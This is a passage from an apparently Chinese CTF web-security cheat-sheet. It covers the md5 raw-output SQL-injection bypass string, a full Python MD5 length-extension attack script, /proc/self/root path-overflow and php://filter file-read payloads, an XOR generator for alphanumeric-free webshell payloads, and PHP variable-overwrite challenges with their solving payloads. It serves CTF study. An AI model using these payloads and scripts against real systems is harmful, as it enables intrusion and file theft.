+</span></span></code></pre></div><h3 id=passwordmd5passtrue绕过 class=headerLink><a href=#passwordmd5passtrue%e7%bb%95%e8%bf%87 class=header-mark></a>password=md5($pass,true)绕过</h3><p>md5() 函数会将我们输入的值，加密，然后转换成16字符的二进制格式，由于<code>ffifdyop</code>被md5加密后的<code>276f722736c95d99e921722cf9ed621c</code>转换成16位原始二进制格式为<code>'or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>，这个字符串前几位刚好是<code>' or '6</code></p><table><thead><tr><th style=text-align:left><strong>MD5加密</strong></th><th style=text-align:left><strong>276F722736C95D99E921722CF9ED621C</strong></th></tr></thead><tbody><tr><td style=text-align:left><strong>16位原始二进制格式</strong></td><td style=text-align:left><strong>&lsquo;or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c</strong></td></tr><tr><td style=text-align:left><strong>string</strong></td><td style=text-align:left><strong>&lsquo;or’6]!r,b</strong></td></tr></tbody></table><h3 id=md5长度扩展攻击哈希长度攻击 class=headerLink><a href=#md5%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb%e5%93%88%e5%b8%8c%e9%95%bf%e5%ba%a6%e6%94%bb%e5%87%bb class=header-mark></a>md5长度扩展攻击（哈希长度攻击）</h3><p><a href=https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html target=_blank rel="noopener noreferrer">哈希长度扩展攻击</a></p><p><a href=https://luoingly.top/post/md5-length-extension-attack/ target=_blank rel="noopener noreferrer">浅析 MD5 长度扩展攻击 (MD5 Length Extension Attack)</a></p><p>工具：<a href=https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py target=_blank rel="noopener noreferrer">https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>from struct import pack, unpack
+</span></span><span class=line><span class=cl>from math import floor, sin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#34;&#34;&#34;
+</span></span><span class=line><span class=cl>MD5 Extension Attack
+</span></span><span class=line><span class=cl>====================
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@refs
+</span></span><span class=line><span class=cl>https://github.com/shellfeel/hash-ext-attack
+</span></span><span class=line><span class=cl>&#34;&#34;&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>class MD5:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    def __init__(self):
+</span></span><span class=line><span class=cl>        self.A, self.B, self.C, self.D = \
+</span></span><span class=line><span class=cl>            (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)  # initial values
+</span></span><span class=line><span class=cl>        self.r: list[int] = \
+</span></span><span class=line><span class=cl>            [7, 12, 17, 22] * 4 + [5,  9, 14, 20] * 4 + \
+</span></span><span class=line><span class=cl>            [4, 11, 16, 23] * 4 + [6, 10, 15, 21] * 4  # shift values
+</span></span><span class=line><span class=cl>        self.k: list[int] = \
+</span></span><span class=line><span class=cl>            [floor(abs(sin(i + 1)) * pow(2, 32))
+</span></span><span class=line><span class=cl>             for i in range(64)]  # constants
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    def _lrot(self, x: int, n: int) -&gt; int:
+</span></span><span class=line><span class=cl>        # left rotate
+</span></span><span class=line><span class=cl>        return (x &lt;&lt; n) | (x &gt;&gt; 32 - n)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    def update(self, chunk: bytes) -&gt; None:
+</span></span><span class=line><span class=cl>        # update the hash for a chunk of data (64 bytes)
+</span></span><span class=line><span class=cl>        w = list(unpack(&#39;&lt;&#39;+&#39;I&#39;*16, chunk))
+</span></span><span class=line><span class=cl>        a, b, c, d = self.A, self.B, self.C, self.D
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        for i in range(64):
+</span></span><span class=line><span class=cl>            if i &lt; 16:
+</span></span><span class=line><span class=cl>                f = (b &amp; c) | ((~b) &amp; d)
+</span></span><span class=line><span class=cl>                flag = i
+</span></span><span class=line><span class=cl>            elif i &lt; 32:
+</span></span><span class=line><span class=cl>                f = (b &amp; d) | (c &amp; (~d))
+</span></span><span class=line><span class=cl>                flag = (5 * i + 1) % 16
+</span></span><span class=line><span class=cl>            elif i &lt; 48:
+</span></span><span class=line><span class=cl>                f = (b ^ c ^ d)
+</span></span><span class=line><span class=cl>                flag = (3 * i + 5) % 16
+</span></span><span class=line><span class=cl>            else:
+</span></span><span class=line><span class=cl>                f = c ^ (b | (~d))
+</span></span><span class=line><span class=cl>                flag = (7 * i) % 16
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            tmp = b + \
+</span></span><span class=line><span class=cl>                self._lrot((a + f + self.k[i] + w[flag])
+</span></span><span class=line><span class=cl>                           &amp; 0xffffffff, self.r[i])
+</span></span><span class=line><span class=cl>            a, b, c, d = d, tmp &amp; 0xffffffff, b, c
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        self.A = (self.A + a) &amp; 0xffffffff
+</span></span><span class=line><span class=cl>        self.B = (self.B + b) &amp; 0xffffffff
+</span></span><span class=line><span class=cl>        self.C = (self.C + c) &amp; 0xffffffff
+</span></span><span class=line><span class=cl>        self.D = (self.D + d) &amp; 0xffffffff
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    def extend(self, msg: bytes) -&gt; None:
+</span></span><span class=line><span class=cl>        # extend the hash with a new message (padded)
+</span></span><span class=line><span class=cl>        assert len(msg) % 64 == 0
+</span></span><span class=line><span class=cl>        for i in range(0, len(msg), 64):
+</span></span><span class=line><span class=cl>            self.update(msg[i:i + 64])
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    def padding(self, msg: bytes) -&gt; bytes:
+</span></span><span class=line><span class=cl>        # pad the message
+</span></span><span class=line><span class=cl>        length = pack(&#39;&lt;Q&#39;, len(msg) * 8)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        msg += b&#39;\x80&#39;
+</span></span><span class=line><span class=cl>        msg += b&#39;\x00&#39; * ((56 - len(msg)) % 64)
+</span></span><span class=line><span class=cl>        msg += length
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        return msg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    def digest(self) -&gt; bytes:
+</span></span><span class=line><span class=cl>        # return the hash
+</span></span><span class=line><span class=cl>        return pack(&#39;&lt;IIII&#39;, self.A, self.B, self.C, self.D)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def verify_md5(test_string: bytes) -&gt; None:
+</span></span><span class=line><span class=cl>    # (DEBUG function) verify the MD5 implementation
+</span></span><span class=line><span class=cl>    from hashlib import md5 as md5_hashlib
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    def md5_manual(msg: bytes) -&gt; bytes:
+</span></span><span class=line><span class=cl>        md5 = MD5()
+</span></span><span class=line><span class=cl>        md5.extend(md5.padding(msg))
+</span></span><span class=line><span class=cl>        return md5.digest()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    manual_result = md5_manual(test_string).hex()
+</span></span><span class=line><span class=cl>    hashlib_result = md5_hashlib(test_string).hexdigest()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    assert manual_result == hashlib_result, &#34;Test failed!&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def attack(message_len: int, known_hash: str,
+</span></span><span class=line><span class=cl>           append_str: bytes) -&gt; tuple:
+</span></span><span class=line><span class=cl>    # MD5 extension attack
+</span></span><span class=line><span class=cl>    md5 = MD5()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    previous_text = md5.padding(b&#34;*&#34; * message_len)
+</span></span><span class=line><span class=cl>    current_text = previous_text + append_str
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    md5.A, md5.B, md5.C, md5.D = unpack(&#34;&lt;IIII&#34;, bytes.fromhex(known_hash))
+</span></span><span class=line><span class=cl>    md5.extend(md5.padding(current_text)[len(previous_text):])
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    return current_text[message_len:], md5.digest().hex()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>if __name__ == &#39;__main__&#39;:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    message_len = int(input(&#34;[&gt;] Input known text length: &#34;))
+</span></span><span class=line><span class=cl>    known_hash = input(&#34;[&gt;] Input known hash: &#34;).strip()
+</span></span><span class=line><span class=cl>    append_text = input(&#34;[&gt;] Input append text: &#34;).strip().encode()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    print(&#34;[*] Attacking...&#34;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    extend_str, final_hash = attack(message_len, known_hash, append_text)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    from urllib.parse import quote
+</span></span><span class=line><span class=cl>    from base64 import b64encode
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    print(&#34;[+] Extend text:&#34;, extend_str)
+</span></span><span class=line><span class=cl>    print(&#34;[+] Extend text (URL encoded):&#34;, quote(extend_str))
+</span></span><span class=line><span class=cl>    print(&#34;[+] Extend text (Base64):&#34;, b64encode(extend_str).decode())
+</span></span><span class=line><span class=cl>    print(&#34;[+] Final hash:&#34;, final_hash)
+</span></span></code></pre></div><p>此时就可以扩展出admin后缀</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105096.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105096.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105096.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105096.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105096.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105096.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105096.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105096.png></a></figure></p><h2 id=目录穿越 class=headerLink><a href=#%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a class=header-mark></a>目录穿越</h2><p>通过绝对路径/相对路径绕过正则对文件名的检测, 例如 <code>preg_match('/flag.php/', $str)</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>./flag.php
+</span></span><span class=line><span class=cl>./ctfshow/../flag.php
+</span></span><span class=line><span class=cl>/var/www/html/flag.php
+</span></span></code></pre></div><p>利用 Linux 下的软链接绕过</p><p><a href=https://www.anquanke.com/post/id/213235 target=_blank rel="noopener noreferrer">php源码分析 require_once 绕过不能重复包含文件的限制</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
+</span></span><span class=line><span class=cl>roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
+</span></span><span class=line><span class=cl>c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
+</span></span><span class=line><span class=cl>self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
+</span></span><span class=line><span class=cl>lf/root/proc/self/root/var/www/html/flag.php
+</span></span></code></pre></div><h2 id=伪协议 class=headerLink><a href=#%e4%bc%aa%e5%8d%8f%e8%ae%ae class=header-mark></a>伪协议</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105097.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105097.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105097.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105097.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105097.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105097.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105097.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105097.png></a></figure></p><p>常见的 <code>php://filter</code> <code>php://input</code> <code>data://</code> 都很熟悉了</p><p>下面是一些不是很常见的 payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>?file=compress.zlib://flag.php
+</span></span><span class=line><span class=cl>?file=php://filter/ctfshow/resource=flag.php
+</span></span></code></pre></div><p><code>**php://filter**</code>** 遇到不存在的过滤器会直接跳过, 可以绕过一些对关键字的检测**</p><h2 id=is_file目录溢出 class=headerLink><a href=#is_file%e7%9b%ae%e5%bd%95%e6%ba%a2%e5%87%ba class=header-mark></a><code>is_file</code>目录溢出</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105098.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105098.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105098.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105098.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105098.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105098.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105098.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105098.png></a></figure></p><p><code>is_file()</code>目录溢出漏洞, 大概意思就是通过多级嵌套绕过检测</p><p>这里的<code>/proc/self/root</code>是一个指向<code>/</code>的软连接</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105099.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105099.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105099.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105099.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105099.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105099.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105099.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105099.png></a></figure></p><p><code>is_file</code>函数能处理的长度有限,用<code>/proc/self/root</code>可以目录溢出</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+</span></span></code></pre></div><h2 id=三元运算符 class=headerLink><a href=#%e4%b8%89%e5%85%83%e8%bf%90%e7%ae%97%e7%ac%a6 class=header-mark></a>三元运算符</h2><p><code>(expr1)?(expr2):(expr3); //表达式1?表达式2:表达式3</code></p><p>如果条件“expr1”成立，则执行语句“expr2”，否则执行“expr3”</p><p>有时候构造不带分号 payload 时需要用到三目运算符</p><h2 id=位运算 class=headerLink><a href=#%e4%bd%8d%e8%bf%90%e7%ae%97 class=header-mark></a>位运算</h2><p>通过 <code>&</code> <code>|``^</code> <code>~</code> 来构造无字母数字的 webshell</p><p>原理是 PHP 7 支持以 <code>($a)($b)</code> 的形式调用函数并传参</p><p><a href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html target=_blank rel="noopener noreferrer">无字母数字webshell之提高篇</a></p><p>python 脚本</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>import re
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>preg = &#39;[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;\*\+\-]+&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def convertToURL(s):
+</span></span><span class=line><span class=cl>    if s &lt; 16:
+</span></span><span class=line><span class=cl>        return &#39;%0&#39; + str(hex(s).replace(&#39;0x&#39;, &#39;&#39;))
+</span></span><span class=line><span class=cl>    else:
+</span></span><span class=line><span class=cl>        return &#39;%&#39; + str(hex(s).replace(&#39;0x&#39;, &#39;&#39;))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def generateDicts():
+</span></span><span class=line><span class=cl>    dicts = {}
+</span></span><span class=line><span class=cl>    for i in range(256):
+</span></span><span class=line><span class=cl>        for j in range(256):
+</span></span><span class=line><span class=cl>            if not re.match(preg, chr(i), re.I) and not re.match(preg, chr(j), re.I):
+</span></span><span class=line><span class=cl>                k = i ^ j
+</span></span><span class=line><span class=cl>                if k in range(32, 127):
+</span></span><span class=line><span class=cl>                    if not k in dicts.keys():
+</span></span><span class=line><span class=cl>                        dicts[chr(k)] = [convertToURL(i), convertToURL(j)]
+</span></span><span class=line><span class=cl>    return dicts
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def generatePayload(dicts, payload):
+</span></span><span class=line><span class=cl>    s1 = &#39;&#39;
+</span></span><span class=line><span class=cl>    s2 = &#39;&#39;
+</span></span><span class=line><span class=cl>    for s in payload:
+</span></span><span class=line><span class=cl>        s1 += dicts[s][0]
+</span></span><span class=line><span class=cl>        s2 += dicts[s][1]
+</span></span><span class=line><span class=cl>    return f&#39;(&#34;{s1}&#34;^&#34;{s2}&#34;)&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>dicts = generateDicts()
+</span></span><span class=line><span class=cl>a = generatePayload(dicts, r&#39;get_ctfshow_fl0g&#39;)
+</span></span><span class=line><span class=cl>print(a)
+</span></span></code></pre></div><p>运算方式可以自己改</p><p>按位取反 <code>~</code> 的话直接在 PHP 里面写就行了</p><h2 id=函数与数字运算 class=headerLink><a href=#%e5%87%bd%e6%95%b0%e4%b8%8e%e6%95%b0%e5%ad%97%e8%bf%90%e7%ae%97 class=header-mark></a>函数与数字运算</h2><p>在 PHP 中, <strong>函数</strong>与<strong>数字</strong>进行运算的时候, <strong>函数能够被正常执行</strong></p><p><code>1+phpinfo()+1;</code></p><p><code>+</code> <code>-</code> <code>*``/</code> <code>&``|</code> 都行, 另外还有 <code>&&</code> <code>||</code></p><h2 id=变量覆盖 class=headerLink><a href=#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96 class=header-mark></a>变量覆盖</h2><p>通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。</p><p>经常导致变量覆盖漏洞场景有：<code>$$</code>使用不当，<code>extract()</code>函数使用不当，<code>parse_str()</code>函数使用不当，<code>import_request_variables()</code>使用不当，开启了全局变量注册等。</p><h3 id=变量覆盖函数 class=headerLink><a href=#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%e5%87%bd%e6%95%b0 class=header-mark></a>变量覆盖函数</h3><p>在PHP 中有如下几种变量覆盖的方式。</p><ol><li>PHP语法导致的变量覆盖</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;? php
+</span></span><span class=line><span class=cl>$a = &#34;want_to_be_a_cat&#34;;
+</span></span><span class=line><span class=cl>$b = &#34;miaow&#34;;
+</span></span><span class=line><span class=cl>$test = $a;
+</span></span><span class=line><span class=cl>$$test = $b;
+</span></span><span class=line><span class=cl>var_dump($want_to_be_a_cat); //输出miaow
+</span></span></code></pre></div><ol start=2><li>PHP函数导致的变量覆盖(<code>extract</code>、<code>parse_str</code>、<code>mb_parse_str</code>、<code>import_request_variables</code>)</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;? php
+</span></span><span class=line><span class=cl>$a = &#34;want_a_cat&#34;;
+</span></span><span class=line><span class=cl>$b = &#34;miao&#34;;
+</span></span><span class=line><span class=cl>extract([$a =&gt;$b]);
+</span></span><span class=line><span class=cl>var_dump($want_a_cat);//输出miao
+</span></span><span class=line><span class=cl>//parse_str(&#34;want_a_cat=miao&#34;);//只在 PHP5.2中出现
+</span></span><span class=line><span class=cl>//var_dump($want_a_cat);//输出miao
+</span></span><span class=line><span class=cl>//mb_parse_str(&#34;want_a_cat=miao&#34;);//只在 PHP5.2中出现
+</span></span><span class=line><span class=cl>//var_dump($want_a_cat);//输出miao
+</span></span><span class=line><span class=cl>//import_request_variables(&#34;p&#34;, &#34;&#34;);
+</span></span><span class=line><span class=cl>//var_dump($want_a_cat); //传入 want_a_cat=miao,输出miao
+</span></span></code></pre></div><ol start=3><li>PHP 配置项导致变量覆盖(register_globals: php. ini 中的一个配置项,配置为 true 之后入 GET/POST 参数都会被赋成变量)</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;? php
+</span></span><span class=line><span class=cl>var_dump($want_to_be_a_cat);//传入want_to_be_a_cat=miao,输出miao
+</span></span></code></pre></div><h3 id=heading class=headerLink><a href=#heading class=header-mark></a><code>$$</code></h3><p><code>$$</code>导致的变量覆盖问题在CTF代码审计题目中经常在<code>foreach</code>中出现</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105100.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105100.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105100.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105100.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105100.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105100.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105100.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105100.png></a></figure></p><p>如以下代码，使用<code>foreach</code>来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求<code>?name=test</code>会将<code>$name</code>的值覆盖，变为<code>test</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>   //?name=test
+</span></span><span class=line><span class=cl>   
+</span></span><span class=line><span class=cl>   //output:string(4) &#34;name&#34; string(4) &#34;test&#34; string(4) &#34;test&#34; test
+</span></span><span class=line><span class=cl>   
+</span></span><span class=line><span class=cl>   $name=&#39;thinking&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   foreach ($_GET as $key =&gt; $value)
+</span></span><span class=line><span class=cl>   {
+</span></span><span class=line><span class=cl>       $$key = $value;
+</span></span><span class=line><span class=cl>   }
+</span></span><span class=line><span class=cl>   var_dump($key);
+</span></span><span class=line><span class=cl>   var_dump($value);
+</span></span><span class=line><span class=cl>   var_dump($$key);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   echo $name;
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></div><h4 id=例题1 class=headerLink><a href=#%e4%be%8b%e9%a2%981 class=header-mark></a>例题1</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   $flag = &#39;flaaaaaag&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   $_403 = &#34;Access Denied&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   $_200 = &#34;Welcome Admin&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   if ($_SERVER[&#34;REQUEST_METHOD&#34;] != &#34;POST&#34;)
+</span></span><span class=line><span class=cl>   {
+</span></span><span class=line><span class=cl>         die(&#34;BugsBunnyCTF is here :p…&#34;);
+</span></span><span class=line><span class=cl>   }
+</span></span><span class=line><span class=cl>   if ( !isset($_POST[&#34;flag&#34;]) )
+</span></span><span class=line><span class=cl>   {
+</span></span><span class=line><span class=cl>         die($_403);
+</span></span><span class=line><span class=cl>   }
+</span></span><span class=line><span class=cl>   foreach ($_GET as $key =&gt; $value)
+</span></span><span class=line><span class=cl>   {
+</span></span><span class=line><span class=cl>         $$key = $$value;
+</span></span><span class=line><span class=cl>   }
+</span></span><span class=line><span class=cl>   foreach ($_POST as $key =&gt; $value)
+</span></span><span class=line><span class=cl>   {
+</span></span><span class=line><span class=cl>         $$key = $value;
+</span></span><span class=line><span class=cl>   }
+</span></span><span class=line><span class=cl>   if ( $_POST[&#34;flag&#34;] !== $flag )
+</span></span><span class=line><span class=cl>   {
+</span></span><span class=line><span class=cl>         die($_403);
+</span></span><span class=line><span class=cl>   }
+</span></span><span class=line><span class=cl>   echo &#34;flaaaaaag&#34;;
+</span></span><span class=line><span class=cl>   die($_200);
+</span></span><span class=line><span class=cl>   
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></div><p>**题目分析： **</p><p>需要满足3个if里的条件才能获取<code>$flag</code>，题目中使用了两个<code>foreach</code>并且也使用了<code>$$</code>两个<code>foreach</code>中对<code>$$key</code>的处理是不一样的，满足条件后会将<code>$flag</code>里面的值打印出来。</p><p>代码会将flag的值给覆盖掉，所以需要先将flag的值赋给<code>_200</code>或<code>_403</code>变量，然后利用<code>die($_200)</code>或<code>die($_403)</code>将flag打印出来。</p><p>**解题方法： **</p><p>由于代码会将<code>$flag</code>的值给覆盖掉，所以只能利用第一个<code>foreach</code>先将<code>$flag</code>的值赋给<code>$_200</code>，然后利用<code>die($_200)</code>将原本的flag值打印出来。</p><p><strong>最终payload：</strong></p><p>GET DATA：<code>?_200=flag</code></p><p>POST DATA：<code>flag=aaaaaaaaaaaaaaaaaaaaa</code><br><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105101.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105101.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105101.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105101.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105101.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105101.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105101.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105101.png></a></figure></p><h4 id=例题2bjdctf2020mark-loves-cat class=headerLink><a href=#%e4%be%8b%e9%a2%982bjdctf2020mark-loves-cat class=header-mark></a>例题2([BJDCTF2020]Mark loves cat)</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>include &#39;flag.php&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$yds = &#34;dog&#34;;
+</span></span><span class=line><span class=cl>$is = &#34;cat&#34;;
+</span></span><span class=line><span class=cl>$handsome = &#39;yds&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>foreach($_POST as $x =&gt; $y){
+</span></span><span class=line><span class=cl>    $$x = $y;  
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>foreach($_GET as $x =&gt; $y){
+</span></span><span class=line><span class=cl>    $$x = $$y;  
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>foreach($_GET as $x =&gt; $y){
+</span></span><span class=line><span class=cl>    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){ 
+</span></span><span class=line><span class=cl>        exit($handsome);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){  
+</span></span><span class=line><span class=cl>    exit($yds);
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;){   
